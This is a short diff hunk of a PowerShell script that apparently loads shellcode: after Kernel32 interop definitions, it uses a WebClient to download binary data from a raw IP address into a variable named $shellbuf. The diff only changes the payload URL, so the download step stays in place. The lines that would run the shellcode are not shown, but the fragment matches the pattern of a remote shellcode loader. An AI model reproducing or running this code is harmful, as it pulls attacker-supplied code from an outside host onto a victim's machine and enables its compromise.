@@ -50,7 +50,7 @@ public static class Kernel32
 "@
 
 $webClient = New-Object System.Net.WebClient
-$url = "http://45.83.140.12/pot/jack/logo.bin"
+$url = "http://45.83.140.12/log/log.bin"
 
 $shellbuf = $webClient.DownloadData($url)
 $shellsize = $shellbuf.Length
